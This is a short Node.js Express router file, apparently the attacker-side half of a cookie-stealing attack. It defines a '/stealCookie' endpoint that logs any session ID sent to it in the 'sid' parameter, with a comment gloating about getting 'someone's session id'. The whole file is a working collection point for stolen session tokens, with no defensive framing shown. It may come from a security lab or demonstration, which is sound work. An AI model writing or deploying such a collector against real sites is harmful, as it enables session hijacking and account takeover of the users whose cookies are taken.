"use strict"

var express = require('express');

var router = express.Router();

router.get('/stealCookie', function (req, res, next) {
    // we get someone's session id!
    console.log("We get someone's session ID:", req.param('sid'));
    res.send('');
});

module.exports = router;